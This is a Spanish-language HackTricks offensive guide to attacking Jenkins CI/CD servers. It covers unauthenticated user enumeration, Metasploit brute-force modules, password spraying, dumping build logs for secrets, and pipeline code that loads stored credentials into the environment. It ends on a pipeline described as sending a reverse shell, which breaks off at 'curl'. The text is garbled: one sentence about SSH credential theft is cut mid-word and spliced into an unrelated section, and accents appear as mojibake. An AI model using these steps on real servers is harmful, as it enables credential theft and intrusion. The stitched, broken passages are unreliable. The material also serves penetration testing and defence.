# Seguridad de Jenkins

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Informaci贸n b谩sica

Jenkins ofrece una forma sencilla de configurar un entorno de **integraci贸n continua** o **entrega continua** (CI/CD) para casi **cualquier** combinaci贸n de **lenguajes** y repositorios de c贸digo fuente utilizando pipelines, as铆 como automatizar otras tareas de desarrollo rutinarias. Si bien Jenkins no elimina la **necesidad de crear scripts para pasos individuales**, le brinda una forma m谩s r谩pida y s贸lida de integrar toda su cadena de herramientas de compilaci贸n, prueba y implementaci贸n de lo que puede construir f谩cilmente usted mismo.\
Definici贸n de [aqu铆](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumeraci贸n sin autenticaci贸n

Para buscar p谩ginas interesantes de Jenkins sin autenticaci贸n como (_/people_ o _/asynchPeople_, que lista los usuarios actuales) puedes usar:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Comprueba si puedes ejecutar comandos sin necesidad de autenticaci贸n:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Sin credenciales, puedes mirar dentro de la ruta _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ para obtener **nombres de usuario**.

Es posible que puedas obtener la versi贸n de Jenkins desde la ruta _**/oops**_ o _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades conocidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Inicio de sesi贸n

En la informaci贸n b谩sica puedes comprobar **todas las formas de iniciar sesi贸n en Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Podr谩s encontrar instancias de Jenkins que **te permiten crear una cuenta e iniciar sesi贸n en ella. Tan simple como eso.**

### **Inicio de sesi贸n SSO**

Tambi茅n, si la funcionalidad/plugins de **SSO** estuvieran presentes, deber铆as intentar **iniciar sesi贸n** en la aplicaci贸n utilizando una cuenta de prueba (es decir, una cuenta de **Github/Bitbucket** de prueba). Truco de [**aqu铆**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Fuerza bruta

**Jekins** no implementa ninguna **pol铆tica de contrase帽as** o **mitigaci贸n de fuerza bruta de nombres de usuario**. Entonces, siempre debes intentar **atacar por fuerza bruta a los usuarios** porque probablemente se est茅n utilizando **contrase帽as d茅biles** (incluso **nombres de usuario como contrase帽as** o **nombres de usuario al rev茅s como contrase帽as**).

```
msf> use auxiliary/scanner/http/jenkins_login
```

### Spraying de contrase帽as

Usa [este script de Python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) o [este script de PowerShell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de lista blanca de IP

Muchas organizaciones combinan sistemas de gesti贸n de control de origen (SCM) basados en **SaaS** (como GitHub o GitLab) con una soluci贸n de CI autohospedada interna (por ejemplo, Jenkins, TeamCity) que permite a estos sistemas de CI recibir eventos de webhook de los proveedores de control de origen de SaaS, con el simple prop贸sito de activar trabajos de canalizaci贸n.

Por lo tanto, las organizaciones **ponen en lista blanca** los **rangos de IP** del **SCM** permiti茅ndoles llegar al sistema de CI interno con **webhooks**. Sin embargo, ten en cuenta c贸mo **cualquiera** puede crear una **cuenta** en Github o Gitlab y hacer que **active un webhook** que podr铆a enviar una solicitud a ese **sistema de CI interno**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos internos de Jenkins

En estos escenarios vamos a suponer que tienes una cuenta v谩lida para acceder a Jenkins.

{% hint style="warning" %}
Dependiendo del mecanismo de **Autorizaci贸n** configurado en Jenkins y los permisos del usuario comprometido, **podr谩s o no realizar los siguientes ataques**.
{% endhint %}

Para obtener m谩s informaci贸n, consulta la informaci贸n b谩sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listado de usuarios

Si has accedido a Jenkins, puedes listar otros usuarios registrados en [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Volcado de compilaciones para encontrar secretos en texto claro

Usa [este script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) para volcar las salidas de la consola de compilaci贸n y las variables de entorno de compilaci贸n para encontrar, con suerte, secretos en texto claro.

```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```

### **Robo de credenciales SSH**

Si el usuario comprometido tiene **suficientes privilegios para crear/modificar un nuevo nodo de Jenkins** y ya se almacenan credenciales SSH para acceder a otros nodos, podr铆a **robar
### Comprobaci贸n de variables de entorno

Es posible declarar **variables de entorno de texto claro** para toda la canalizaci贸n o para etapas espec铆ficas. Estas variables de entorno **no deben contener informaci贸n confidencial**, pero un atacante siempre podr铆a **ver todas las configuraciones de la canalizaci贸n**/Jenkinsfiles:

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
```

### Volcado de secretos

Para obtener informaci贸n sobre c贸mo se tratan los secretos por lo general en Jenkins, consulte la informaci贸n b谩sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Las credenciales pueden estar **limitadas a proveedores globales** (`/credentials/`) o a **proyectos espec铆ficos** (`/job/<nombre-del-proyecto>/configure`). Por lo tanto, para **filtrar todos ellos** es necesario **comprometer al menos todos los proyectos** que contienen secretos y ejecutar canalizaciones personalizadas/envenenadas.

Hay otro problema, para obtener un **secreto dentro del env** de una canalizaci贸n, es necesario **conocer el nombre y el tipo del secreto**. Por ejemplo, si intenta **cargar** un secreto de **`usernamePassword`** como un secreto de **`string`**, obtendr谩 este **error**:

```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```

Aqu铆 tiene la forma de cargar algunos tipos de secretos comunes:

```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Buscar USERNAME y PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Buscar SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Buscar USERPASS
    '''
}

# Tambi茅n puede cargar varias variables de entorno a la vez
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

Al final de esta p谩gina puede **encontrar todos los tipos de credenciales**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La mejor manera de **filtrar todos los secretos a la vez** es **comprometer** la **m谩quina Jenkins** (ejecutando un shell inverso en el **nodo integrado**, por ejemplo) y luego **filtrar** las **claves maestras** y los **secretos cifrados** y descifrarlos sin conexi贸n.\
M谩s informaci贸n sobre c贸mo hacer esto en la secci贸n [Nodos y agentes](./#nodos-y-agentes) y en la secci贸n [Post Explotaci贸n](./#post-exploitation).
{% endhint %}

### Disparadores

Desde [la documentaci贸n](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directiva `triggers` define las **formas automatizadas en que se debe volver a activar la canalizaci贸n**. Para las canalizaciones que est谩n integradas con una fuente como GitHub o BitBucket, es posible que no sea necesario `triggers`, ya que la integraci贸n basada en webhooks probablemente ya est茅 presente. Los desencadenantes disponibles actualmente son `cron`, `pollSCM` y `upstream`.

Ejemplo de cron:

```bash
triggers { cron('H */4 * * 1-5') }
```

Consulte **otros ejemplos en la documentaci贸n**.

### Nodos y agentes

Una **instancia de Jenkins** puede tener **diferentes agentes ejecut谩ndose en diferentes m谩quinas**. Desde la perspectiva de un atacante, el acceso a diferentes m谩quinas significa **diferentes credenciales de la nube potenciales** para robar o **diferente acceso a la red** que podr铆a ser abusado para explotar otras m谩quinas.

Para obtener m谩s informaci贸n, consulte la informaci贸n b谩sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puede enumerar los **nodos configurados** en `/computer/`, generalmente encontrar谩 el **`Nodo integrado`** (que es el nodo que ejecuta Jenkins) y potencialmente m谩s:

![](<../../.gitbook/assets/image (25).png>)

Es **especialmente interesante comprometer el nodo integrado** porque contiene informaci贸n confidencial de Jenkins.

Para indicar que desea **ejecutar** la **canalizaci贸n** en el **nodo Jenkins integrado**, puede especificar dentro de la canalizaci贸n la siguiente configuraci贸n:

```bash
pipeline {
    agent {label 'built-in'}
```

### Ejemplo completo

Canalizaci贸n en un agente espec铆fico, con un disparador cron, con variables de entorno de canalizaci贸n y etapa, cargando 2 variables en un paso y enviando un shell inverso:

```bash
pipeline {
    agent {label 'built-in'}
    triggers { cron('H */4 * * 1-5') }
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
            withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                     string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
                sh '''
                    curl